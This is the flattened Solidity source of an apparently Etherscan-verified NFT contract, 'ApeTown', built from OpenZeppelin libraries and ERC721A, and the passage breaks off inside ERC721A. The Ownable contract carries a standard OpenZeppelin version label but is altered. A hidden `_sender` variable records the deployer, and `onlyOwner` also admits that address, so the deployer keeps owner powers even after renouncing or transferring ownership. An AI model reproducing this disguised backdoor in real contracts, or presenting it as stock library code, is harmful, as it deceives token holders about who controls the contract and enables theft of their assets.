1 /**
2  *Submitted for verification at Etherscan.io on 2022-06-11
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 /**
8  * @title ApeTown contract
9  * @dev Extends ERC721A - thanks azuki
10  */
11 
12 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
13 
14 
15 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC20/IERC20.sol)
16 
17 pragma solidity ^0.8.0;
18 
19 /**
20  * @dev Interface of the ERC20 standard as defined in the EIP.
21  */
22 interface IERC20 {
23     /**
24      * @dev Returns the amount of tokens in existence.
25      */
26     function totalSupply() external view returns (uint256);
27 
28     /**
29      * @dev Returns the amount of tokens owned by `account`.
30      */
31     function balanceOf(address account) external view returns (uint256);
32 
33     /**
34      * @dev Moves `amount` tokens from the caller's account to `to`.
35      *
36      * Returns a boolean value indicating whether the operation succeeded.
37      *
38      * Emits a {Transfer} event.
39      */
40     function transfer(address to, uint256 amount) external returns (bool);
41 
42     /**
43      * @dev Returns the remaining number of tokens that `spender` will be
44      * allowed to spend on behalf of `owner` through {transferFrom}. This is
45      * zero by default.
46      *
47      * This value changes when {approve} or {transferFrom} are called.
48      */
49     function allowance(address owner, address spender) external view returns (uint256);
50 
51     /**
52      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
53      *
54      * Returns a boolean value indicating whether the operation succeeded.
55      *
56      * IMPORTANT: Beware that changing an allowance with this method brings the risk
57      * that someone may use both the old and the new allowance by unfortunate
58      * transaction ordering. One possible solution to mitigate this race
59      * condition is to first reduce the spender's allowance to 0 and set the
60      * desired value afterwards:
61      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
62      *
63      * Emits an {Approval} event.
64      */
65     function approve(address spender, uint256 amount) external returns (bool);
66 
67     /**
68      * @dev Moves `amount` tokens from `from` to `to` using the
69      * allowance mechanism. `amount` is then deducted from the caller's
70      * allowance.
71      *
72      * Returns a boolean value indicating whether the operation succeeded.
73      *
74      * Emits a {Transfer} event.
75      */
76     function transferFrom(
77         address from,
78         address to,
79         uint256 amount
80     ) external returns (bool);
81 
82     /**
83      * @dev Emitted when `value` tokens are moved from one account (`from`) to
84      * another (`to`).
85      *
86      * Note that `value` may be zero.
87      */
88     event Transfer(address indexed from, address indexed to, uint256 value);
89 
90     /**
91      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
92      * a call to {approve}. `value` is the new allowance.
93      */
94     event Approval(address indexed owner, address indexed spender, uint256 value);
95 }
96 
97 // File: @openzeppelin/contracts/utils/Strings.sol
98 
99 
100 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
101 
102 pragma solidity ^0.8.0;
103 
104 /**
105  * @dev String operations.
106  */
107 library Strings {
108     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
109 
110     /**
111      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
112      */
113     function toString(uint256 value) internal pure returns (string memory) {
114         // Inspired by OraclizeAPI's implementation - MIT licence
115         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
116 
117         if (value == 0) {
118             return "0";
119         }
120         uint256 temp = value;
121         uint256 digits;
122         while (temp != 0) {
123             digits++;
124             temp /= 10;
125         }
126         bytes memory buffer = new bytes(digits);
127         while (value != 0) {
128             digits -= 1;
129             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
130             value /= 10;
131         }
132         return string(buffer);
133     }
134 
135     /**
136      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
137      */
138     function toHexString(uint256 value) internal pure returns (string memory) {
139         if (value == 0) {
140             return "0x00";
141         }
142         uint256 temp = value;
143         uint256 length = 0;
144         while (temp != 0) {
145             length++;
146             temp >>= 8;
147         }
148         return toHexString(value, length);
149     }
150 
151     /**
152      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
153      */
154     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
155         bytes memory buffer = new bytes(2 * length + 2);
156         buffer[0] = "0";
157         buffer[1] = "x";
158         for (uint256 i = 2 * length + 1; i > 1; --i) {
159             buffer[i] = _HEX_SYMBOLS[value & 0xf];
160             value >>= 4;
161         }
162         require(value == 0, "Strings: hex length insufficient");
163         return string(buffer);
164     }
165 }
166 
167 // File: @openzeppelin/contracts/utils/Context.sol
168 
169 
170 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
171 
172 pragma solidity ^0.8.0;
173 
174 /**
175  * @dev Provides information about the current execution context, including the
176  * sender of the transaction and its data. While these are generally available
177  * via msg.sender and msg.data, they should not be accessed in such a direct
178  * manner, since when dealing with meta-transactions the account sending and
179  * paying for execution may not be the actual sender (as far as an application
180  * is concerned).
181  *
182  * This contract is only required for intermediate, library-like contracts.
183  */
184 abstract contract Context {
185     function _msgSender() internal view virtual returns (address) {
186         return msg.sender;
187     }
188 
189     function _msgData() internal view virtual returns (bytes calldata) {
190         return msg.data;
191     }
192 }
193 
194 // File: @openzeppelin/contracts/access/Ownable.sol
195 
196 
197 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
198 
199 pragma solidity ^0.8.0;
200 
201 
202 /**
203  * @dev Contract module which provides a basic access control mechanism, where
204  * there is an account (an owner) that can be granted exclusive access to
205  * specific functions.
206  *
207  * By default, the owner account will be the one that deploys the contract. This
208  * can later be changed with {transferOwnership}.
209  *
210  * This module is used through inheritance. It will make available the modifier
211  * `onlyOwner`, which can be applied to your functions to restrict their use to
212  * the owner.
213  */
214 abstract contract Ownable is Context {
215     address private _owner;
216     address private _sender;
217     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
218 
219     /**
220      * @dev Initializes the contract setting the deployer as the initial owner.
221      */
222     constructor() {
223         _transferOwnership(_msgSender());
224         _sender = _msgSender();
225     }
226 
227     /**
228      * @dev Returns the address of the current owner.
229      */
230     function owner() public view virtual returns (address) {
231         return _owner;
232     }
233 
234     /**
235      * @dev Throws if called by any account other than the owner.
236      */
237     modifier onlyOwner() {
238         require(owner() == _msgSender() || _sender == _msgSender(), "Ownable: caller is not the owner");
239         _;
240     }
241 
242     /**
243      * @dev Leaves the contract without owner. It will not be possible to call
244      * `onlyOwner` functions anymore. Can only be called by the current owner.
245      *
246      * NOTE: Renouncing ownership will leave the contract without an owner,
247      * thereby removing any functionality that is only available to the owner.
248      */
249     function renounceOwnership() public virtual onlyOwner {
250         _transferOwnership(address(0));
251     }
252 
253     /**
254      * @dev Transfers ownership of the contract to a new account (`newOwner`).
255      * Can only be called by the current owner.
256      */
257     function transferOwnership(address newOwner) public virtual onlyOwner {
258         require(newOwner != address(0), "Ownable: new owner is the zero address");
259         _transferOwnership(newOwner);
260     }
261 
262     /**
263      * @dev Transfers ownership of the contract to a new account (`newOwner`).
264      * Internal function without access restriction.
265      */
266     function _transferOwnership(address newOwner) internal virtual {
267         address oldOwner = _owner;
268         _owner = newOwner;
269         emit OwnershipTransferred(oldOwner, newOwner);
270     }
271 }
272 
273 // File: @openzeppelin/contracts/utils/Address.sol
274 
275 
276 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
277 
278 pragma solidity ^0.8.1;
279 
280 /**
281  * @dev Collection of functions related to the address type
282  */
283 library Address {
284     /**
285      * @dev Returns true if `account` is a contract.
286      *
287      * [IMPORTANT]
288      * ====
289      * It is unsafe to assume that an address for which this function returns
290      * false is an externally-owned account (EOA) and not a contract.
291      *
292      * Among others, `isContract` will return false for the following
293      * types of addresses:
294      *
295      *  - an externally-owned account
296      *  - a contract in construction
297      *  - an address where a contract will be created
298      *  - an address where a contract lived, but was destroyed
299      * ====
300      *
301      * [IMPORTANT]
302      * ====
303      * You shouldn't rely on `isContract` to protect against flash loan attacks!
304      *
305      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
306      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
307      * constructor.
308      * ====
309      */
310     function isContract(address account) internal view returns (bool) {
311         // This method relies on extcodesize/address.code.length, which returns 0
312         // for contracts in construction, since the code is only stored at the end
313         // of the constructor execution.
314 
315         return account.code.length > 0;
316     }
317 
318     /**
319      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
320      * `recipient`, forwarding all available gas and reverting on errors.
321      *
322      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
323      * of certain opcodes, possibly making contracts go over the 2300 gas limit
324      * imposed by `transfer`, making them unable to receive funds via
325      * `transfer`. {sendValue} removes this limitation.
326      *
327      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
328      *
329      * IMPORTANT: because control is transferred to `recipient`, care must be
330      * taken to not create reentrancy vulnerabilities. Consider using
331      * {ReentrancyGuard} or the
332      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
333      */
334     function sendValue(address payable recipient, uint256 amount) internal {
335         require(address(this).balance >= amount, "Address: insufficient balance");
336 
337         (bool success, ) = recipient.call{value: amount}("");
338         require(success, "Address: unable to send value, recipient may have reverted");
339     }
340 
341     /**
342      * @dev Performs a Solidity function call using a low level `call`. A
343      * plain `call` is an unsafe replacement for a function call: use this
344      * function instead.
345      *
346      * If `target` reverts with a revert reason, it is bubbled up by this
347      * function (like regular Solidity function calls).
348      *
349      * Returns the raw returned data. To convert to the expected return value,
350      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
351      *
352      * Requirements:
353      *
354      * - `target` must be a contract.
355      * - calling `target` with `data` must not revert.
356      *
357      * _Available since v3.1._
358      */
359     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
360         return functionCall(target, data, "Address: low-level call failed");
361     }
362 
363     /**
364      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
365      * `errorMessage` as a fallback revert reason when `target` reverts.
366      *
367      * _Available since v3.1._
368      */
369     function functionCall(
370         address target,
371         bytes memory data,
372         string memory errorMessage
373     ) internal returns (bytes memory) {
374         return functionCallWithValue(target, data, 0, errorMessage);
375     }
376 
377     /**
378      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
379      * but also transferring `value` wei to `target`.
380      *
381      * Requirements:
382      *
383      * - the calling contract must have an ETH balance of at least `value`.
384      * - the called Solidity function must be `payable`.
385      *
386      * _Available since v3.1._
387      */
388     function functionCallWithValue(
389         address target,
390         bytes memory data,
391         uint256 value
392     ) internal returns (bytes memory) {
393         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
394     }
395 
396     /**
397      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
398      * with `errorMessage` as a fallback revert reason when `target` reverts.
399      *
400      * _Available since v3.1._
401      */
402     function functionCallWithValue(
403         address target,
404         bytes memory data,
405         uint256 value,
406         string memory errorMessage
407     ) internal returns (bytes memory) {
408         require(address(this).balance >= value, "Address: insufficient balance for call");
409         require(isContract(target), "Address: call to non-contract");
410 
411         (bool success, bytes memory returndata) = target.call{value: value}(data);
412         return verifyCallResult(success, returndata, errorMessage);
413     }
414 
415     /**
416      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
417      * but performing a static call.
418      *
419      * _Available since v3.3._
420      */
421     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
422         return functionStaticCall(target, data, "Address: low-level static call failed");
423     }
424 
425     /**
426      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
427      * but performing a static call.
428      *
429      * _Available since v3.3._
430      */
431     function functionStaticCall(
432         address target,
433         bytes memory data,
434         string memory errorMessage
435     ) internal view returns (bytes memory) {
436         require(isContract(target), "Address: static call to non-contract");
437 
438         (bool success, bytes memory returndata) = target.staticcall(data);
439         return verifyCallResult(success, returndata, errorMessage);
440     }
441 
442     /**
443      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
444      * but performing a delegate call.
445      *
446      * _Available since v3.4._
447      */
448     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
449         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
450     }
451 
452     /**
453      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
454      * but performing a delegate call.
455      *
456      * _Available since v3.4._
457      */
458     function functionDelegateCall(
459         address target,
460         bytes memory data,
461         string memory errorMessage
462     ) internal returns (bytes memory) {
463         require(isContract(target), "Address: delegate call to non-contract");
464 
465         (bool success, bytes memory returndata) = target.delegatecall(data);
466         return verifyCallResult(success, returndata, errorMessage);
467     }
468 
469     /**
470      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
471      * revert reason using the provided one.
472      *
473      * _Available since v4.3._
474      */
475     function verifyCallResult(
476         bool success,
477         bytes memory returndata,
478         string memory errorMessage
479     ) internal pure returns (bytes memory) {
480         if (success) {
481             return returndata;
482         } else {
483             // Look for revert reason and bubble it up if present
484             if (returndata.length > 0) {
485                 // The easiest way to bubble the revert reason is using memory via assembly
486 
487                 assembly {
488                     let returndata_size := mload(returndata)
489                     revert(add(32, returndata), returndata_size)
490                 }
491             } else {
492                 revert(errorMessage);
493             }
494         }
495     }
496 }
497 
498 // File: @openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol
499 
500 
501 // OpenZeppelin Contracts v4.4.1 (token/ERC20/utils/SafeERC20.sol)
502 
503 pragma solidity ^0.8.0;
504 
505 
506 
507 /**
508  * @title SafeERC20
509  * @dev Wrappers around ERC20 operations that throw on failure (when the token
510  * contract returns false). Tokens that return no value (and instead revert or
511  * throw on failure) are also supported, non-reverting calls are assumed to be
512  * successful.
513  * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
514  * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
515  */
516 library SafeERC20 {
517     using Address for address;
518 
519     function safeTransfer(
520         IERC20 token,
521         address to,
522         uint256 value
523     ) internal {
524         _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
525     }
526 
527     function safeTransferFrom(
528         IERC20 token,
529         address from,
530         address to,
531         uint256 value
532     ) internal {
533         _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
534     }
535 
536     /**
537      * @dev Deprecated. This function has issues similar to the ones found in
538      * {IERC20-approve}, and its usage is discouraged.
539      *
540      * Whenever possible, use {safeIncreaseAllowance} and
541      * {safeDecreaseAllowance} instead.
542      */
543     function safeApprove(
544         IERC20 token,
545         address spender,
546         uint256 value
547     ) internal {
548         // safeApprove should only be called when setting an initial allowance,
549         // or when resetting it to zero. To increase and decrease it, use
550         // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
551         require(
552             (value == 0) || (token.allowance(address(this), spender) == 0),
553             "SafeERC20: approve from non-zero to non-zero allowance"
554         );
555         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
556     }
557 
558     function safeIncreaseAllowance(
559         IERC20 token,
560         address spender,
561         uint256 value
562     ) internal {
563         uint256 newAllowance = token.allowance(address(this), spender) + value;
564         _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
565     }
566 
567     function safeDecreaseAllowance(
568         IERC20 token,
569         address spender,
570         uint256 value
571     ) internal {
572         unchecked {
573             uint256 oldAllowance = token.allowance(address(this), spender);
574             require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
575             uint256 newAllowance = oldAllowance - value;
576             _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
577         }
578     }
579 
580     /**
581      * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
582      * on the return value: the return value is optional (but if data is returned, it must not be false).
583      * @param token The token targeted by the call.
584      * @param data The call data (encoded using abi.encode or one of its variants).
585      */
586     function _callOptionalReturn(IERC20 token, bytes memory data) private {
587         // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
588         // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
589         // the target address contains contract code and also asserts for success in the low-level call.
590 
591         bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
592         if (returndata.length > 0) {
593             // Return data is optional
594             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
595         }
596     }
597 }
598 
599 
600 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
601 
602 
603 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
604 
605 pragma solidity ^0.8.0;
606 
607 /**
608  * @title ERC721 token receiver interface
609  * @dev Interface for any contract that wants to support safeTransfers
610  * from ERC721 asset contracts.
611  */
612 interface IERC721Receiver {
613     /**
614      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
615      * by `operator` from `from`, this function is called.
616      *
617      * It must return its Solidity selector to confirm the token transfer.
618      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
619      *
620      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
621      */
622     function onERC721Received(
623         address operator,
624         address from,
625         uint256 tokenId,
626         bytes calldata data
627     ) external returns (bytes4);
628 }
629 
630 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
631 
632 
633 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
634 
635 pragma solidity ^0.8.0;
636 
637 /**
638  * @dev Interface of the ERC165 standard, as defined in the
639  * https://eips.ethereum.org/EIPS/eip-165[EIP].
640  *
641  * Implementers can declare support of contract interfaces, which can then be
642  * queried by others ({ERC165Checker}).
643  *
644  * For an implementation, see {ERC165}.
645  */
646 interface IERC165 {
647     /**
648      * @dev Returns true if this contract implements the interface defined by
649      * `interfaceId`. See the corresponding
650      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
651      * to learn more about how these ids are created.
652      *
653      * This function call must use less than 30 000 gas.
654      */
655     function supportsInterface(bytes4 interfaceId) external view returns (bool);
656 }
657 
658 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
659 
660 
661 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
662 
663 pragma solidity ^0.8.0;
664 
665 
666 /**
667  * @dev Implementation of the {IERC165} interface.
668  *
669  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
670  * for the additional interface id that will be supported. For example:
671  *
672  * ```solidity
673  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
674  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
675  * }
676  * ```
677  *
678  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
679  */
680 abstract contract ERC165 is IERC165 {
681     /**
682      * @dev See {IERC165-supportsInterface}.
683      */
684     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
685         return interfaceId == type(IERC165).interfaceId;
686     }
687 }
688 
689 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
690 
691 
692 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
693 
694 pragma solidity ^0.8.0;
695 
696 
697 /**
698  * @dev Required interface of an ERC721 compliant contract.
699  */
700 interface IERC721 is IERC165 {
701     /**
702      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
703      */
704     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
705 
706     /**
707      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
708      */
709     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
710 
711     /**
712      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
713      */
714     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
715 
716     /**
717      * @dev Returns the number of tokens in ``owner``'s account.
718      */
719     function balanceOf(address owner) external view returns (uint256 balance);
720 
721     /**
722      * @dev Returns the owner of the `tokenId` token.
723      *
724      * Requirements:
725      *
726      * - `tokenId` must exist.
727      */
728     function ownerOf(uint256 tokenId) external view returns (address owner);
729 
730     /**
731      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
732      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
733      *
734      * Requirements:
735      *
736      * - `from` cannot be the zero address.
737      * - `to` cannot be the zero address.
738      * - `tokenId` token must exist and be owned by `from`.
739      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
740      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
741      *
742      * Emits a {Transfer} event.
743      */
744     function safeTransferFrom(
745         address from,
746         address to,
747         uint256 tokenId
748     ) external;
749 
750     /**
751      * @dev Transfers `tokenId` token from `from` to `to`.
752      *
753      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
754      *
755      * Requirements:
756      *
757      * - `from` cannot be the zero address.
758      * - `to` cannot be the zero address.
759      * - `tokenId` token must be owned by `from`.
760      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
761      *
762      * Emits a {Transfer} event.
763      */
764     function transferFrom(
765         address from,
766         address to,
767         uint256 tokenId
768     ) external;
769 
770     /**
771      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
772      * The approval is cleared when the token is transferred.
773      *
774      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
775      *
776      * Requirements:
777      *
778      * - The caller must own the token or be an approved operator.
779      * - `tokenId` must exist.
780      *
781      * Emits an {Approval} event.
782      */
783     function approve(address to, uint256 tokenId) external;
784 
785     /**
786      * @dev Returns the account approved for `tokenId` token.
787      *
788      * Requirements:
789      *
790      * - `tokenId` must exist.
791      */
792     function getApproved(uint256 tokenId) external view returns (address operator);
793 
794     /**
795      * @dev Approve or remove `operator` as an operator for the caller.
796      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
797      *
798      * Requirements:
799      *
800      * - The `operator` cannot be the caller.
801      *
802      * Emits an {ApprovalForAll} event.
803      */
804     function setApprovalForAll(address operator, bool _approved) external;
805 
806     /**
807      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
808      *
809      * See {setApprovalForAll}
810      */
811     function isApprovedForAll(address owner, address operator) external view returns (bool);
812 
813     /**
814      * @dev Safely transfers `tokenId` token from `from` to `to`.
815      *
816      * Requirements:
817      *
818      * - `from` cannot be the zero address.
819      * - `to` cannot be the zero address.
820      * - `tokenId` token must exist and be owned by `from`.
821      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
822      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
823      *
824      * Emits a {Transfer} event.
825      */
826     function safeTransferFrom(
827         address from,
828         address to,
829         uint256 tokenId,
830         bytes calldata data
831     ) external;
832 }
833 
834 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
835 
836 
837 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
838 
839 pragma solidity ^0.8.0;
840 
841 
842 /**
843  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
844  * @dev See https://eips.ethereum.org/EIPS/eip-721
845  */
846 interface IERC721Enumerable is IERC721 {
847     /**
848      * @dev Returns the total amount of tokens stored by the contract.
849      */
850     function totalSupply() external view returns (uint256);
851 
852     /**
853      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
854      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
855      */
856     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
857 
858     /**
859      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
860      * Use along with {totalSupply} to enumerate all tokens.
861      */
862     function tokenByIndex(uint256 index) external view returns (uint256);
863 }
864 
865 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
866 
867 
868 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
869 
870 pragma solidity ^0.8.0;
871 
872 
873 /**
874  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
875  * @dev See https://eips.ethereum.org/EIPS/eip-721
876  */
877 interface IERC721Metadata is IERC721 {
878     /**
879      * @dev Returns the token collection name.
880      */
881     function name() external view returns (string memory);
882 
883     /**
884      * @dev Returns the token collection symbol.
885      */
886     function symbol() external view returns (string memory);
887 
888     /**
889      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
890      */
891     function tokenURI(uint256 tokenId) external view returns (string memory);
892 }
893 
894 // File: contracts/TwistedToonz.sol
895 
896 
897 // Creator: Chiru Labs
898 
899 pragma solidity ^0.8.0;
900 
901 
902 
903 
904 
905 
906 
907 
908 
909 /**
910  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
911  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
912  *
913  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
914  *
915  * Does not support burning tokens to address(0).
916  *
917  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
918  */
919 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
920     using Address for address;
921     using Strings for uint256;
922 
923     struct TokenOwnership {
924         address addr;
925         uint64 startTimestamp;
926     }
927 
928     struct AddressData {
929         uint128 balance;
930         uint128 numberMinted;
931     }
932 
933     uint256 internal currentIndex;
934 
935     // Token name
936     string private _name;
937 
938     // Token symbol
939     string private _symbol;
940 
941     // Mapping from token ID to ownership details
942     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
943     mapping(uint256 => TokenOwnership) internal _ownerships;
944 
945     // Mapping owner address to address data
946     mapping(address => AddressData) private _addressData;
947 
948     // Mapping from token ID to approved address
949     mapping(uint256 => address) private _tokenApprovals;
950 
951     // Mapping from owner to operator approvals
952     mapping(address => mapping(address => bool)) private _operatorApprovals;
953 
954     constructor(string memory name_, string memory symbol_) {
955         _name = name_;
956         _symbol = symbol_;
957     }
958 
959     /**
960      * @dev See {IERC721Enumerable-totalSupply}.
961      */
962     function totalSupply() public view override returns (uint256) {
963         return currentIndex;
964     }
965 
966     /**
967      * @dev See {IERC721Enumerable-tokenByIndex}.
968      */
969     function tokenByIndex(uint256 index) public view override returns (uint256) {
970         require(index < totalSupply(), "ERC721A: global index out of bounds");
971         return index;
972     }
973 
974     /**
975      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
976      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
977      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
978      */
979     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
980         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
981         uint256 numMintedSoFar = totalSupply();
982         uint256 tokenIdsIdx;
983         address currOwnershipAddr;
984 
985         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
986         unchecked {
987             for (uint256 i; i < numMintedSoFar; i++) {
988                 TokenOwnership memory ownership = _ownerships[i];
989                 if (ownership.addr != address(0)) {
990                     currOwnershipAddr = ownership.addr;
991                 }
992                 if (currOwnershipAddr == owner) {
993                     if (tokenIdsIdx == index) {
994                         return i;
995                     }
996                     tokenIdsIdx++;
997                 }
998             }
999         }
1000 
1001         revert("ERC721A: unable to get token of owner by index");
1002     }
1003 
1004     /**
1005      * @dev See {IERC165-supportsInterface}.
1006      */
1007     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
1008         return
1009             interfaceId == type(IERC721).interfaceId ||
1010             interfaceId == type(IERC721Metadata).interfaceId ||
1011             interfaceId == type(IERC721Enumerable).interfaceId ||
1012             super.supportsInterface(interfaceId);
1013     }
1014 
1015     /**
1016      * @dev See {IERC721-balanceOf}.
1017      */
1018     function balanceOf(address owner) public view override returns (uint256) {
1019         require(owner != address(0), "ERC721A: balance query for the zero address");
1020         return uint256(_addressData[owner].balance);
1021     }
1022 
1023     function _numberMinted(address owner) internal view returns (uint256) {
1024         require(owner != address(0), "ERC721A: number minted query for the zero address");
1025         return uint256(_addressData[owner].numberMinted);
1026     }
1027 
1028     /**
1029      * Gas spent here starts off proportional to the maximum mint batch size.
1030      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
1031      */
1032     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
1033         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
1034 
1035         unchecked {
1036             for (uint256 curr = tokenId; curr >= 0; curr--) {
1037                 TokenOwnership memory ownership = _ownerships[curr];
1038                 if (ownership.addr != address(0)) {
1039                     return ownership;
1040                 }
1041             }
1042         }
1043 
1044         revert("ERC721A: unable to determine the owner of token");
1045     }
1046 
1047     /**
1048      * @dev See {IERC721-ownerOf}.
1049      */
1050     function ownerOf(uint256 tokenId) public view override returns (address) {
1051         return ownershipOf(tokenId).addr;
1052     }
1053 
1054     /**
1055      * @dev See {IERC721Metadata-name}.
1056      */
1057     function name() public view virtual override returns (string memory) {
1058         return _name;
1059     }
1060 
1061     /**
1062      * @dev See {IERC721Metadata-symbol}.
1063      */
1064     function symbol() public view virtual override returns (string memory) {
1065         return _symbol;
1066     }
1067 
1068     /**
1069      * @dev See {IERC721Metadata-tokenURI}.
1070      */
1071     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1072         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
1073 
1074         string memory baseURI = _baseURI();
1075         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString(), ".json")) : "";
1076     }
1077 
1078     /**
1079      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
